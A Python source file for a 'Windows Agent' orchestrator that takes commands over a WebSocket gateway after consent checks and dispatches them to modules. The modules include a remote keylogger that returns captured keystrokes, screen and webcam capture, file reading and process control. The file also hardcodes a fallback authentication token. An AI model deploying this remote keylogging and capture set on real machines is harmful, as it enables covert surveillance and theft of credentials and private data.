"""Windows Agent Main Orchestrator.
This script binds all 7 modules, the security controller, and the local WebSocket
gateway client loop together. It listens for remote commands, triggers local
Windows consent dialogs, executes the requested actions safely, and returns
results.
Prerequisites: pip install websockets psutil mss opencv-python pynput plyer """

from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import sys
from typing import Any

import cv2

# Import file modules and the security controller
from agent_security import SecurityController, verify_gateway_token, validate_gateway_url
from client_agent import show_notification
from desktop_capture_utils import capture_primary_screen_png, capture_camera_frame, RemoteKeylogger
from sandbox_file_manager import list_drives, list_directory, read_file, write_file, delete_file
from windows_process_manager import list_processes, launch_application, stop_process
from windows_system_control import get_system_metrics, lock_workstation, sleep_system, restart_system, shutdown_system

# Default environment configuration
GATEWAY_URL = os.getenv("WINDOWS_AGENT_GATEWAY_URL", "ws://127.0.0.1:8765")
AGENT_TOKEN = os.getenv("WINDOWS_AGENT_GATEWAY_TOKEN", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")


class AgentOrchestrator:
    """Quản lý trạng thái và điều phối thực thi các module của Agent."""

    def __init__(self) -> None:
        self.security = SecurityController(allowed_applications={
            "notepad": r"C:\Windows\System32\notepad.exe",
            "calc": r"C:\Windows\System32\calc.exe"
        })
        self.keylogger = RemoteKeylogger()
        
    async def dispatch_command(self, raw_message: str | dict[str, Any]) -> dict[str, Any]:
        """Tiếp nhận thông điệp từ Gateway/Web App, xác thực và điều phối module."""
        try:
            if isinstance(raw_message, str):
                request_data = json.loads(raw_message)
            else:
                request_data = raw_message

            validated_request = self.security.authorize_request(request_data)
            if validated_request is None:
                return {"status": "denied", "message": "User or policy rejected the request."}

            module = validated_request.module
            params = validated_request.parameters
            req_id = validated_request.request_id

            logging.info("Executing module: %s (Request ID: %s)", module, req_id)
            show_notification("Windows Agent Active", f"Executing module: {module.replace('_', ' ').title()}")

            result_data = self._execute_module(module, params)
            return {"status": "success", "request_id": req_id, "module": module, "data": result_data}

        except Exception as exc:
            logging.exception("Error executing command")
            return {"status": "error", "message": str(exc)}

    def _execute_module(self, module: str, params: dict[str, Any]) -> Any:
        """Thực thi mã nguồn thực tế của từng module."""
        
        if module == "application_launch":
            executable = params.get("executable")
            proc = launch_application(executable)
            return {"pid": proc.pid, "status": "launched"}

        elif module == "process_terminate":
            pid = params.get("pid")
            stopped = stop_process(pid)
            return {"pid": pid, "terminated": stopped}
        
        elif module == "list_processes":
            procs = list_processes(include_gui_status=True)
            return [{"pid": p.pid, "name": p.name, "cpu": p.cpu_percent, "ram": p.memory_percent, "gui": p.is_gui_application} for p in procs]

        elif module == "screen_capture":
            png_bytes = capture_primary_screen_png()
            return {"image_base64": base64.b64encode(png_bytes).decode("utf-8")}

        elif module == "keylogger":
            action = params.get("action", "start")
            if action == "start":
                if not self.keylogger.is_running:
                    self.keylogger.start()
                return {"keylogger_status": "running"}
            elif action == "stop":
                self.keylogger.stop()
                return {"keylogger_status": "stopped"}
            elif action == "get":
                captured_text = self.keylogger.get_and_clear()
                return {"keystrokes": captured_text}

        elif module == "file_list":
            path_arg = params.get("path", ".")
            items = list_directory(path_arg)
            return {"items": [str(p) for p in items]}
        elif module == "file_read":
            file_path = params.get("path")
            content_bytes = read_file(file_path)
            return {"content_base64": base64.b64encode(content_bytes).decode("utf-8")}

        elif module == "camera_capture":
            cam_index = params.get("camera_index", 0)
            frame = capture_camera_frame(cam_index)
            success, encoded_img = cv2.imencode(".jpg", frame)
            if not success:
                raise RuntimeError("Failed to encode camera frame.")
            return {"image_base64": base64.b64encode(encoded_img.tobytes()).decode("utf-8")}

        elif module == "power_control":
            action = params.get("action")
            if action == "lock":
                lock_workstation()
            elif action == "sleep":
                sleep_system(confirm=True)
            elif action == "restart":
                restart_system(confirm=True)
            elif action == "shutdown":
                shutdown_system(confirm=True)
            return {"power_action": action, "executed": True}
            
        elif module == "system_metrics":
            metrics = get_system_metrics()
            return {"ram_usage_percent": metrics.ram_usage_percent, "uptime_seconds": metrics.uptime.total_seconds()}

        raise ValueError(f"Unknown or unhandled module execution: {module}")


async def run_agent_daemon() -> None:
    """Vòng lặp duy trì kết nối WebSocket an toàn đến Gateway của nhóm."""
    orchestrator = AgentOrchestrator()
    
    if not orchestrator.security.ensure_initial_consent():
        logging.error("Initial agent consent denied by user. Shutting down.")
        sys.exit(1)

    from websockets.asyncio.client import connect

    while True:
        try:
            logging.info("Connecting to gateway at %s...", GATEWAY_URL)
            validate_gateway_url(GATEWAY_URL)
            
            async with connect(
                GATEWAY_URL, 
                additional_headers={"X-Agent-Token": AGENT_TOKEN},
                open_timeout=10
            ) as websocket:
                logging.info("Successfully connected and authenticated with the local gateway.")
                
                async for message in websocket:
                    response = await orchestrator.dispatch_command(message)
                    await websocket.send(json.dumps(response))
                    
        except asyncio.CancelledError:
            break
        except Exception as exc:
            logging.warning("Connection issue (%s). Reconnecting in 3 seconds...", exc)
            await asyncio.sleep(3)


def main() -> None:
    logging.basicConfig(
        level=os.getenv("LOG_LEVEL", "INFO").upper(),
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )
    logging.info("Starting Windows Agent Orchestrator...")
    try:
        asyncio.run(run_agent_daemon())
    except KeyboardInterrupt:
        logging.info("Agent stopped by user.")


if __name__ == "__main__":
    main()